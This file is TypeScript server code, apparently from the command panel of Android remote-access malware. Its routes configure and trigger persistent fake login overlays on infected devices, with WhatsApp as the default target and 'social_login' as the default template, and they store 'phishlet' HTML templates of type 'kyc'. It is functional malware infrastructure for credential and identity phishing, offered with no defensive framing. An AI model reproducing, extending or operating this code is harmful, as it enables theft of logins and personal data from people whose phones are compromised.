import type { FastifyInstance } from 'fastify';
import { getDb, dbHelpers } from '../db/index.js';
import { overlayConfigs, phishletTemplates, clients } from '../db/schema.js';
import { eq, desc } from 'drizzle-orm';
import { requirePermission, getRequestUser } from '../middleware/auth.js';
import { log } from '../utils/logger.js';
import { socketService } from '../services/socket.js';
import { CMD } from '../types/index.js';

export async function overlayRoutes(app: FastifyInstance) {
  // Get overlay config for a device
  app.get('/api/client/:id/overlay/config', {
    preHandler: [app.auth, requirePermission('device:overlay')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    const d = getDb();
    const config = d.select().from(overlayConfigs).where(eq(overlayConfigs.clientId, id)).get();
    return { success: true, data: config || { enabled: false, persistent: true, targetApps: '[]', templateType: 'social_login' } };
  });

  // Update overlay config
  app.post('/api/client/:id/overlay/config', {
    preHandler: [app.auth, requirePermission('device:overlay')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    const body = request.body as any;
    const d = getDb();
    const existing = d.select().from(overlayConfigs).where(eq(overlayConfigs.clientId, id)).get();

    if (existing) {
      d.update(overlayConfigs).set({
        enabled: body.enabled ?? existing.enabled,
        persistent: body.persistent ?? existing.persistent,
        targetApps: body.targetApps ?? existing.targetApps,
        templateType: body.templateType ?? existing.templateType,
        updatedAt: new Date(),
      }).where(eq(overlayConfigs.clientId, id)).run();
    } else {
      d.insert(overlayConfigs).values({
        clientId: id,
        enabled: body.enabled ?? false,
        persistent: body.persistent ?? true,
        targetApps: body.targetApps ?? '[]',
        templateType: body.templateType ?? 'social_login',
      }).run();
    }

    // Push config to device
    socketService.sendCommand(id, CMD.OVERLAY, {
      action: 'overlay_config',
      enabled: body.enabled ?? false,
      persistent: body.persistent ?? true,
      apps: typeof body.targetApps === 'string' ? JSON.parse(body.targetApps) : body.targetApps,
      templateType: body.templateType ?? 'social_login',
    });

    return { success: true, data: { message: 'Overlay config updated' } };
  });

  // Trigger overlay on device
  app.post('/api/client/:id/overlay/trigger', {
    preHandler: [app.auth, requirePermission('device:overlay')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    const body = request.body as any;
    socketService.sendCommand(id, CMD.OVERLAY, {
      action: 'overlay_show',
      overlayPackage: body.package || 'com.whatsapp',
      overlayTemplate: body.template || 'social_login',
      overlayPersistent: body.persistent ?? true,
    });
    return { success: true, data: { message: 'Overlay triggered' } };
  });

  // Hide overlay
  app.post('/api/client/:id/overlay/hide', {
    preHandler: [app.auth, requirePermission('device:overlay')],
  }, async (request, reply) => {
    const { id } = request.params as { id: string };
    const user = getRequestUser(request);
    if (!canAccessDevice(user, id)) {
      return reply.code(403).send({ success: false, error: 'Access denied' });
    }
    socketService.sendCommand(id, CMD.OVERLAY, { action: 'overlay_hide' });
    return { success: true, data: { message: 'Overlay hidden' } };
  });

  // Get phishlet templates
  app.get('/api/phishlet/templates', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async () => {
    const d = getDb();
    const templates = d.select().from(phishletTemplates).orderBy(desc(phishletTemplates.createdAt)).all();
    return { success: true, data: templates };
  });

  // Create phishlet template
  app.post('/api/phishlet/templates', {
    preHandler: [app.auth, requirePermission('device:phishlet')],
  }, async (request, reply) => {
    const body = request.body as any;
    const d = getDb();
    const result = d.insert(phishletTemplates).values({
      name: body.name,
      type: body.type || 'kyc',
      html: body.html,
      targetApps: body.targetApps || '[]',
      isDefault: body.isDefault || false,
    }).run();
    return { success: true, data: { id: result.lastInsertRowid } };
  });
}

function canAccessDevice(user: any, deviceId: string): boolean {
  if (user.role === 'admin') return true;
  const d = getDb();
  const client = d.select({ ownerId: clients.ownerId }).from(clients).where(eq(clients.id, deviceId)).get();

  return client?.ownerId === user.userId;
}
